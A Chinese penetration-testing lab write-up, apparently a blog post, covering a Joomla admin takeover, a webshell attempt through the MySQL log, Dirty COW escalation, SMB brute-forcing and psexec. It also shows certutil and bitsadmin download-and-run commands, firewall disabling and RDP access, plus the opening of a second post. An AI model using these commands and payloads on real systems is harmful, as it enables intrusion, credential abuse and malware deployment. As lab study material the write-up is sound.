src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124851226.png" alt="image-20240202124851226"></p><p>尝试访问</p><p>发现不行，经过思考这个应该是mysql的,经过尝试应该是Mysql的密码但是只是一个普通用户的密码</p></li><li><p>查看mysql的表</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202125942610.png" alt="image-20240202125942610"></p><p>发现不能爆破出密码</p><p>尝试添加用户，根据joomla官方的方式添加</p><p>[如何恢复或重置管理员密码？ - Joomla! Documentation](<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn#:~:text=%E6%B7%BB%E5%8A%A0%E6%96%B0%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E4%BD%BF%E7%94%A8r">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn#:~:text=添加新超级管理员使用r</a> 1 导航到phpMyAdmin，选择Joomla的数据库！ 站点中的左下拉列表框。 这将显示屏幕左侧的数据库表。 2 按工具栏中的“SQL”按钮在选定的数据库上运行SQL查询。 这将显示一个字段名为“Run,SQL query%2Fqueries on database&lt;您的数据库&gt;”。 3 删除任何文本在这一领域，复制并粘贴以下查询下面，按下“Go”按钮执行查询和添加新的管理员用户表。 4 使用下面的SQL查询添加另一个管理员帐户。)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205115149200.png" alt="image-20240205115149200"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205115327584.png" alt="image-20240205115327584"></p><p>就直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- Active: 1706849566963@@192.168.79.146@3306@joomla#umnbt_users<br><br>INSERT INTO<br>    umnbt_users (<br>        `name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`<br>    )<br>VALUES (<br>        &#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()<br>    );<br><br>INSERT INTO<br>    umnbt_user_usergroup_map (`user_id`, `group_id`)<br>VALUES (LAST_INSERT_ID(), &#x27;8&#x27;);<br><br></code></pre></td></tr></table></figure><p>发现不太行，但是发现了另一个users的表尝试写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- Active: 1706849566963@@192.168.79.146@3306@joomla#am2zu_users<br><br>INSERT INTO<br>    am2zu_users (<br>        `name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`<br>    )<br>VALUES (<br>        &#x27;Administrator2&#x27;, &#x27;admin123456&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()<br>    );<br><br>INSERT INTO<br>    am2zu_user_usergroup_map (`user_id`, `group_id`)<br>VALUES (LAST_INSERT_ID(), &#x27;8&#x27;);<br></code></pre></td></tr></table></figure><p>然后登录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205121612846.png" alt="image-20240205121612846"></p><p>成功</p></li></ol><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><ol><li><p>利用cve-2021-23132</p><p><a href="https://www.cnblogs.com/starci/p/15174896.html">【漏洞复现 CVE-2021-23132】Joomla远程代码执行漏洞 - StarCi - 博客园 (cnblogs.com)</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205121925176.png" alt="image-20240205121925176"></p><p>搜索，发现这个</p><p>修改路径为根目录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205122234674.png" alt="image-20240205122234674"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205122240419.png" alt="image-20240205122240419"></p><p>删除&#x2F;administrator&#x2F;components&#x2F;com_users&#x2F;config.xml</p><p>我是工作目录换到这个&#x2F;administrator&#x2F;components&#x2F;com_users，然后删除的</p><p>然后上传新的config.xml</p><p>发现上传会有一点小问题，所以改变策略直接修改模板</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205124404241.png" alt="image-20240205124404241"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205125133550.png" alt="image-20240205125133550"></p><p>成功</p></li><li><p>mysql 日志反弹shell</p><p>首先得找到网站的根目录</p><p>根据后台，所以猜测是&#x2F;var&#x2F;www&#x2F;html</p><p>尝试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW VARIABLES LIKE &#x27;general%&#x27;;<br><br>set global general_log = on;<br><br>set global general_log_file = &#x27;/var/www/html/index.php&#x27;;<br><br>select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;;<br></code></pre></td></tr></table></figure><p>发现不能上传</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205134102347.png" alt="image-20240205134102347"></p><p>发现写入不了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205134322682.png" alt="image-20240205134322682"></p><p>将mysql 日志记录关了</p></li><li><p>上传msf</p><p>连接之后发现并不能执行命令<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205140258167.png" alt="image-20240205140258167"></p><p>只能找找文件里面有哪些内容是可以使用的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205140348120.png" alt="image-20240205140348120"></p><p>尝试使用ssh连接一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205140636483.png" alt="image-20240205140636483"></p><p>发现能连接，但是感觉这个方式太不常见了</p><p>还可以尝试绕过</p><p>我想直接修改php.ini文件，发现并不行</p><p>发现蚁剑的插件可以绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205141714644.png" alt="image-20240205141714644"></p><p>发现回显还是有点问题，所以将回显放入文件里面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205144556090.png" alt="image-20240205144556090"></p><p>但是发现执行不了payload</p><p>通过发现，好像使用antsword和直接使用ssh的结果不一样</p><p>尝试使用ssh上传payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205154503330.png" alt="image-20240205154503330"></p><p>直接反弹……</p></li><li><p>提权</p><p>这里发现使用的内核很低，可以尝试使用使用脏牛提权</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205160545817.png" alt="image-20240205160545817"></p><p>上传脏牛</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/FireFart/</span>dirtycow<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">gcc -pthread <span class="hljs-keyword">dirty.c </span>-o <span class="hljs-keyword">dirty </span>-lcrypt<br></code></pre></td></tr></table></figure><p>他会创建一个角色</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">firefart</span>   <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205161320363.png" alt="image-20240205161320363"></p><p>提权成功</p></li><li><p>环境分析</p><p>现在出现了两个主机</p><p>第一个是ngnix代理服务的机器</p><p>一个是真实的，使用ssh 连接的是真实的主机</p></li><li><p>搭建代理</p><p>我这里使用的是stowaway</p><p>先在本地运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x admin<br>./admin -l 8987 -s hack<br></code></pre></td></tr></table></figure><p>然后使用agent连接就好了，agent运行到受害者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./agent -c 192.168.79.138 -s hack<br></code></pre></td></tr></table></figure><p>输入topo发现已经有一个连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205173025392.png" alt="image-20240205173025392"></p></li></ol><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><ol><li><p>查看当前网段</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205182825733.png" alt="image-20240205182825733"></p></li><li><p>使用fscan查看内网信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205185703340.png" alt="image-20240205185703340"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240205185649166.png" alt="image-20240205185649166"></p></li><li><p>使用nmap扫描端口信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240206102610606.png" alt="image-20240206102610606"></p></li></ol><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><ol><li><p>尝试对三台主机进行445 永恒之蓝利用</p><p>发现利用失败</p></li><li><p>1433端口利用</p><p>发现是sql server的服务</p><p>尝试弱口令爆破，发现没有用</p></li><li><p>尝试对smb服务进行爆破</p><ul><li><p>使用msf的smb_login模块</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">search</span> smb_login<br>use <br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> PASS_FILE <span class="hljs-type">path</span><br><span class="hljs-keyword">set</span> SMBUser<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206115436980.png" alt="image-20240206115436980"></p><p>发现30的密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206115617835.png" alt="image-20240206115617835"></p><p>20的密码</p></li><li><p>使用hydra</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206114807676.png" alt="image-20240206114807676"></p></li></ul></li><li><p>尝试利用smb</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><br><span class="hljs-built_in">set</span> SMBUser administrator<br><br><span class="hljs-built_in">set</span> SMBPass 123qwe!ASD<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.93.30<br><br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206132317942.png" alt="image-20240206132317942"></p><p>只有一台30的主机利用成功</p><p>迁移进程</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">migrate pid</span><br></code></pre></td></tr></table></figure><p>都将进程迁移到lsaa.exe</p><p>然后联动cs</p><p>传递不了</p><p>关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs \">netsh advfirewall set publicprofile state off<br></code></pre></td></tr></table></figure><p>打开远程桌面服务</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>尝试连接连接不上</p><p>发现命令执行收到很大的限制</p></li><li><p>使用wmiexec</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains wmiexec<span class="hljs-selector-class">.py</span> <span class="hljs-string">&#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br>proxychains wmiexec<span class="hljs-selector-class">.py</span> <span class="hljs-string">&#x27;administrator:123qwe!ASD@192.168.93.20&#x27;</span><br></code></pre></td></tr></table></figure><p>成功反弹shell</p></li><li><p>发现100存在python2</p><p>生成一个正向的payload ，然后使用100主机的http.server服务</p><p>查看20 主机是32 or 64位机器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172111891.png" alt="image-20240207172111891"></p><p>为了保险我省32和64一样生成了一个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>bind_tcp  lport=<span class="hljs-number">10668</span> -f exe -o bind32.exe<br>msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>bind_tcp  lport=<span class="hljs-number">10669</span> -f exe -o bind.exe<br></code></pre></td></tr></table></figure><p>然后使用http.server传输文件（也可以使用scp）都比较方便</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172404222.png" alt="image-20240207172404222"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172444742.png" alt="image-20240207172444742">再由100开启http服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>在windows 上下载文件的方式有很多，现在使用certutil</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">下载文件<br>certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/win7.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\win7.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\win7.<span class="hljs-keyword">exe</span><br>清楚缓存<br>certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/win7.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">delete</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173040151.png" alt="image-20240207173040151"></p><p>拿下20</p><p>换一个进程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173448644.png" alt="image-20240207173448644"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173454362.png" alt="image-20240207173454362"></p><p>现在的权限就是system了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173545693.png" alt="image-20240207173545693"></p><p>同理对10主机、</p><p>但是一直一直利用不上</p></li><li><p>尝试对20 联动cs</p><p>失败</p></li><li><p>尝试cs 的payload </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207175958569.png" alt="image-20240207175958569"></p><p>不知道为什么上线不了cs</p></li><li><p>对20主机开启远程桌面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207181721267.png" alt="image-20240207181721267"></p><p>发现成功，但是还有10主机，这个应该是一个域控</p></li><li><p>尝试使用20主机(winserver 2008)作为smb服务器</p></li></ol><p>   重新创建一个bind payload</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207182227586.png" alt="image-20240207182227586"></p><p>   然后传递给100主机</p><p>   老方法下载payload</p>   <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">93.100</span>:<span class="hljs-number">8080</span>/bind32.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\bind32.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\bind32.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>   确实下载了，但是不能执行</p><p>   尝试关闭防火墙</p>   <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p>   还是没有用，那就只有使用前面反弹的shell了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>全部主机都上线了，但是域控查找了资料好像都没有上线，这个是一个遗憾</p><h2 id="信息收集部分"><a href="#信息收集部分" class="headerlink" title="信息收集部分"></a>信息收集部分</h2><ol><li><p>很意外的mysql是一个弱口令，然后直接获取root的权限</p><p>通过信息收集也获取了其他用户的密码</p></li><li><p>信息收集的步骤中<br>对于靶场来说，最重要的就是端口收集了，可以收集到对应的服务，然后通过服务查找相应的漏洞，或者通过通过80web漏洞</p></li><li><p>Joomla的配置文件利用注意添加波浪线</p><p>注意添加用户的方法</p></li></ol><h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><ol><li><p>Joomla 中查找文件，编辑代码的时候，注意需要添加路径</p><p>对模板的利用中，注意将一句话木马写在稍微前面一点不然不能利用</p><p>还有就是有一些文件的话最好不要删除</p></li><li><p>这个部分是有ngnix反向代理</p><p>注意得到的shell是反向代理的客户端的不是主机的</p><p>这个分辨是因为webshell和ssh通一个地址是不一样的shell</p><p>可以直接暂时的关闭ngnix</p></li><li><p>通过ssh连接，靶场直接给密码了，这个应该不会遇到，得学习一下如何绕过ngnix</p></li><li><p>还有就是绕过php disable_function 可以使用蚁剑的插件</p></li><li><p>linux提权的时候使用脏牛进行提权</p></li></ol><h2 id="内网信息收集-1"><a href="#内网信息收集-1" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><ol><li><p>主机存活检测，使用的是fscan</p><p>但是这个有一个好处就是不用自指定其他的参数，全部进行</p><p>如果使用的是nmap的话可以使用</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">主机存活探测<br><span class="hljs-keyword">nmap</span> -sS (SYN扫描) 或 <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sN</span> (NULL扫描) 或 <span class="hljs-keyword">nmap</span> -sF (FIN扫描) 或 <span class="hljs-keyword">nmap</span> -sX (Xmas扫描)<br><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> [目标IP地址或子网掩码/CIDR表示法]<br>某一个主机的端口扫描<br><span class="hljs-keyword">nmap</span> -sT -<span class="hljs-keyword">p</span>- [目标IP或域名]<br>获取操作系统信息<br><span class="hljs-keyword">nmap</span> -O -sV -T4 [目标IP或域名]<br></code></pre></td></tr></table></figure></li><li><p>最主要的还是对每一个主机进行端口扫描</p></li></ol><h2 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h2><p>个人现阶段，思路还不够多</p><ol><li><p>使用msf smb_login</p><p>可以爆破密码，但是密码必须要强大</p></li><li><p>msf单个模块使用代理的方式</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> proxies <span class="hljs-comment">socks5:ip:port</span><br></code></pre></td></tr></table></figure><p>或者使用setg全局设置</p></li><li><p>hydra 也可以爆破smb服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l administrator -P(大写) <span class="hljs-regexp">/home/</span>kali/password.txt(字典路径) <span class="hljs-number">192.168</span>.<span class="hljs-number">93.10</span> smb<br></code></pre></td></tr></table></figure></li><li><p>exploit&#x2F;windows&#x2F;smb&#x2F;psexec</p><p>smb 服务的利用模块</p></li><li><p>wmiexec</p><p>可以反弹shell</p><p>但是感觉有很多限制</p></li><li><p>防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">关闭防火墙<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br>开启防火墙<br>netsh advfirewall show allprofiles<br></code></pre></td></tr></table></figure></li><li><p>使用smb服务</p><p>连接的时候需要指定具体的盘符</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>administrator <span class="hljs-string">&quot;123qwe!ASD&quot;</span><br></code></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>\c<span class="hljs-variable">$</span>\filename save_name <span class="hljs-comment"># 默认保存到当前的文件</span><br><span class="hljs-built_in">copy</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span>\c<span class="hljs-variable">$</span>\bind32_2012.exe bind32_2012.exe<br></code></pre></td></tr></table></figure></li><li><p>文件传输</p><p>除了使用smb服务还可以使用其他的服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">93.100</span>:<span class="hljs-number">8080</span>/bind.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\bind.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\bind.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bitsadmin <span class="hljs-regexp">/transfer shell http:/</span><span class="hljs-regexp">/192.168.93.100:8080/</span>bind32.exe C:\bind32.exe;start C:\windows\temp\bind32.exe<br></code></pre></td></tr></table></figure></li><li><p>使用代理开启远程桌面</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> rdesktop -u administrator -p <span class="hljs-string">&#x27;zxcASDqw123!!&#x27;</span> <span class="hljs-number">192.168.93.10</span> <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网横向移动</title>
    <link href="/2024/02/02/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2024/02/02/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>用于已经得到了一个主机之后想要获取其他的主机方法</p><h1 id="简单是示例"><a href="#简单是示例" class="headerlink" title="简单是示例"></a>简单是示例</h1><p>首先这个是一个ad域</p><blockquote><p>web  winserver 2012</p><p>pc  win7</p><p>dc  winserver2012</p></blockquote><p>由于需要进入域环境，所以我直接拿web服务器开涮，扫描端口</p><p>发现了445端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202230557572.png" alt="image-20240202230557572"></p><p>然后使用msf对其利用，刚好发现第一个就成功了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202231259829.png" alt="image-20240202231259829"></p><p>派发给cs</p><p><img 